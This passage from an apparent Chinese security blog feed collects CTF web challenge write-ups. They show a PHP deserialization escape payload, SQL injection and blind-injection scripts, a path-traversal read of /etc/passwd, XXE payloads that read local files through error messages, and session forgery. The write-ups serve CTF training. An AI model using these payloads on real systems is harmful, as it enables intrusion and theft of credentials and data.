class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="string">"select password,id from user where username=?"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=<span class="keyword">new</span> Info();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="comment">//return "0-0";</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CtrlCase=<span class="keyword">new</span> dbCtrl;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql= <span class="keyword">new</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="string">'admin'</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> UpdateHelper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">12</span>:<span class="string">"UpdateHelper"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">7</span>:<span class="string">"newinfo"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"sql"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"User"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">45</span>:<span class="string">"select password,id from user where username=?"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;N;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;N;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;<span class="string">O:</span><span class="number">6</span>:<span class="string">"dbCtrl"</span>:<span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"token"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>getNewInfo</code>方法默认返回的内容</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;N;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;N;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>这里我们来控制<code>nickname</code>，那么我们需要逃逸出来的字符串为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";N;s:8:"</span>nickname<span class="string">";N;s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":2:&#123;s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>计算一下他们的长度然后进行填充</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="string">'O:12:"UpdateHelper":3:&#123;s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:&#123;s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:5:"token";s:5:"admin";&#125;&#125;&#125;&#125;'</span>;</span><br><span class="line">$a = <span class="string">'";s:8:"CtrlCase";'</span>.$b;</span><br><span class="line"><span class="keyword">echo</span> strlen($a);</span><br></pre></td></tr></table></figure><p>长度<code>305</code></p><p>这里使用<code>union</code>来进行替换，则需要<code>305</code>个<code>union</code></p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/7.png" alt="7"></p><p>最后的payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";N;s:8:"</span>nickname<span class="string">";N;s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":2:&#123;s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>在<code>upload.php</code>中传入执行，来查询<code>admin</code>的密码</p><p><img src="/2020/02/26/春秋战“疫”easyphp题解/8.png" alt="8"></p><p><code>MD5</code>解一下后拿出密码明文，登陆后就可以拿到<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;题目考点：&lt;/p&gt;
&lt;p&gt;反序列化POP链构造&lt;/p&gt;
&lt;p&gt;反序列化字符串逃逸&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;题目源码&quot;&gt;&lt;a href=&quot;#题目源码&quot; class=&quot;headerlink&quot; title=&quot;题目源码&quot;&gt;&lt;/a
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>积累的一些web题目</title>
    <link href="https://yml-sec.top/2019/12/30/%E7%A7%AF%E7%B4%AF%E7%9A%84%E4%B8%80%E4%BA%9Bweb%E9%A2%98%E7%9B%AE/"/>
    <id>https://yml-sec.top/2019/12/30/%E7%A7%AF%E7%B4%AF%E7%9A%84%E4%B8%80%E4%BA%9Bweb%E9%A2%98%E7%9B%AE/</id>
    <published>2019-12-30T11:36:53.000Z</published>
    <updated>2020-01-18T16:16:58.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><blockquote><p>考点：SQL注入</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/32.png" alt="32"></p><p>随便输入用户名和密码后查看源码得到提示</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MMZF<span class="name">M422</span>K<span class="number">5</span>HDASKD<span class="symbol">N5</span>TVU<span class="number">3</span>SKOZRFGQRRMMZF<span class="name">M6</span>KJJBS<span class="name">G6</span>WSYJJWESSCWPJ<span class="symbol">NFQSTVLFLTC3</span>CJIQYGOSTZKJ<span class="number">2</span><span class="attr">VSVZRNRFHOPJ5</span></span><br></pre></td></tr></table></figure><p>解开为</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure><p>我们需要以<code>admin</code>的身份登陆，可以使用<code>union</code>查询，控制为任意密码</p><p><img src="/2019/12/30/积累的一些web题目/E:/blog\myblog\source\_posts\积累的一些web题目\33.png" alt="33"></p><h2 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h2><blockquote><p>考点：文件读取绕过</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/29.png" alt="29"></p><p>查看源代码可以看到存在uploads目录</p><p><img src="/2019/12/30/积累的一些web题目/30.png" alt="30"></p><p>下载时抓包，发现可能存在任意文件读取，测试后发现将<code>../</code>替换为空，这里使用双写绕过即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....<span class="regexp">//</span>....<span class="regexp">//</span>....<span class="regexp">//</span>....<span class="regexp">//</span>....<span class="regexp">//</span>....<span class="regexp">//</span>....<span class="regexp">//</span>etc..<span class="regexp">//</span>passwd</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/31.png" alt="31"></p><h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><blockquote><p>考点：xxe</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/27.png" alt=""></p><p>题目是想让我们上传与示例相符的<code>xml</code>文件，不难联想到<code>xxe</code>，在测试时发现某些关键字被过滤了，借鉴这篇文章</p><p><a href="https://xz.aliyun.com/t/4059" target="_blank" rel="noopener">https://xz.aliyun.com/t/4059</a></p><p>可以用<code>utf-16</code>编码来绕过，使用<code>UltraEdit</code>软件来编写<code>utf-16</code>的<code>payload</code></p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version='1.0' encoding="utf-16"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE message[ </span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">message</span> <span class="attr">ANY</span> &gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">NUMBER</span> '&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">flag</span>"&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">eval</span> "&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x26</span>;#<span class="attr">x25</span>; <span class="attr">error</span> <span class="attr">SYSTEM</span> &amp;#<span class="attr">x27</span>;<span class="attr">file:</span>///<span class="attr">yemoli</span>/&amp;#<span class="attr">x25</span>;<span class="attr">file</span>;&amp;#<span class="attr">x27</span>;&gt;</span>"&gt;</span></span><br><span class="line"><span class="xml">&amp;#x25;eval;</span></span><br><span class="line"><span class="xml">&amp;#x25;error;</span></span><br><span class="line"><span class="xml">'&gt;</span></span><br><span class="line"><span class="xml"></span><span class="perl">%NUMBER;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt; </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>qqq<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>a@qq.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">message</span>&gt;</span>a<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>按照正常方式发现回显位有长度限制，所以这里用到了与<code>[GoogleCTF2019 Quals]Bnv</code>中一样的利用报错带出数据的方法</p><p><img src="/2019/12/30/积累的一些web题目/E:/blog\myblog\source\_posts\积累的一些web题目\28.png" alt=""></p><h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><blockquote><p>考点：xxe</p></blockquote><p>题目界面：</p><p><img src="/2019/12/30/积累的一些web题目/25.png" alt="25"></p><p>该题目主要考点是xxe在无法加载外部dtd时错误数据的带出，参考下面这篇文章</p><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><p><code>payload:</code></p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> </span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE message[ </span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">message</span> <span class="attr">ANY</span> &gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">NUMBER</span> '&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">flag</span>"&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">eval</span> "&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x26</span>;#<span class="attr">x25</span>; <span class="attr">error</span> <span class="attr">SYSTEM</span> &amp;#<span class="attr">x27</span>;<span class="attr">file:</span>///<span class="attr">yemoli</span>/&amp;#<span class="attr">x25</span>;<span class="attr">file</span>;&amp;#<span class="attr">x27</span>;&gt;</span>"&gt;</span></span><br><span class="line"><span class="xml">&amp;#x25;eval;</span></span><br><span class="line"><span class="xml">&amp;#x25;error;</span></span><br><span class="line"><span class="xml">'&gt;</span></span><br><span class="line"><span class="xml"></span><span class="perl">%NUMBER;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt; </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span>a<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/26.png" alt="26"></p><h2 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2><blockquote><p>考点：session伪造</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/22.png" alt="22"></p><p>登陆后可以添加<code>note</code>,然后以压缩文件形式下载下来，当访问<code>flag</code>页面时提示我们需要成为<code>admin</code>，审计源码，会发现<code>session</code>和压缩文件存储在同一路径下，看一下压缩文件的命名</p><p><img src="/2019/12/30/积累的一些web题目/23.png" alt="23"></p><p>由用户名，<code>-</code>，八个随机串，和后缀构成，这个时候就给了我们伪造<code>session</code>的机会</p><p>以用户名<code>sess_</code>登陆，然后添加<code>note</code>，title为<code>|N;admin|b:1;</code>，<code>body</code>随意，在下载时将<code>type</code>改为<code>.</code>，这样就得到了伪造的<code>session</code>名称，替换一下即可</p><p><img src="/2019/12/30/积累的一些web题目/24.png" alt="24"></p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><blockquote><p>考点：二次注入</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/21.png" alt="21"></p><p>在<code>changepwd.php</code>处存在二次注入利用点，可利用报错函数带出数据</p><p>放上一个用户名的<code>payload</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1mio"||(extractvalue(1,concat(0x5c,reverse((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_here))<span class="keyword">from</span>(<span class="keyword">users</span>)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">'f'</span>))))))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>注入过程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())</span><br><span class="line"></span><br><span class="line">article,flag,<span class="keyword">users</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'users'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">name</span>,pwd,email,real_flag_1s_here</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>(real_flag_1s_here)<span class="keyword">from</span>(<span class="keyword">users</span>)<span class="keyword">where</span>(<span class="keyword">name</span>=<span class="string">'admin'</span>)</span><br><span class="line">(real_flag_1s_here)regexp(<span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">reverse</span>((<span class="keyword">select</span>(<span class="keyword">group_concat</span>(real_flag_1s_here))<span class="keyword">from</span>(<span class="keyword">users</span>)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">'f'</span>)))</span><br></pre></td></tr></table></figure><p>由于最后带出<code>flag</code>的时候，报错函数存在回显长度限制，可以使用<code>reverse</code>函数逆序输出，拼接得到完整的结果</p><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><blockquote><p>考点：SQL盲注</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/E:/blog\myblog\source\_posts\积累的一些web题目\20.png" alt="20"></p><p>题目注入点在<code>search.php?id=1</code>当<code>id=1=0</code>和<code>id=1=1</code>时会有不同结果返回，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://5d1768ad-6d8d-462b-96c1-5c28f6edb4fc.node3.buuoj.cn/search.php?id=1="</span></span><br><span class="line">s = requests.session()</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">dict_sql = <span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&amp;*/()_-+=&#123;&#125;.:,'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">2000</span>):</span><br><span class="line">    print(<span class="string">'===================================='</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dict_sql:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        payload = <span class="string">"((ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1)))=&#123;&#125;)"</span>.format(i,ord(j))</span><br><span class="line">        url1 = url+payload</span><br><span class="line">        html = s.get(url1,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Click others~~~'</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            result = result+j</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(group_concat(<span class="built_in">table_name</span>))<span class="keyword">from</span>(information_schema.<span class="keyword">tables</span>)<span class="keyword">where</span>(table_schema=<span class="string">'geek'</span>)</span><br><span class="line"></span><br><span class="line">F1naI1y,Flaaaaag</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>(group_concat(<span class="built_in">column_name</span>))<span class="keyword">from</span>(information_schema.<span class="keyword">columns</span>)<span class="keyword">where</span>(<span class="built_in">table_name</span>=<span class="string">'F1naI1y'</span>)</span><br><span class="line"></span><br><span class="line">id,username,<span class="keyword">password</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span>(group_concat(<span class="keyword">password</span>))<span class="keyword">from</span>(F1naI1y)</span><br></pre></td></tr></table></figure><h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><blockquote><p>考点:SQL注入，反序列化</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/15.png" alt=""></p><p>根据题目首页面泄露的信息，在<code>GitHub</code>上找到了该站点源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 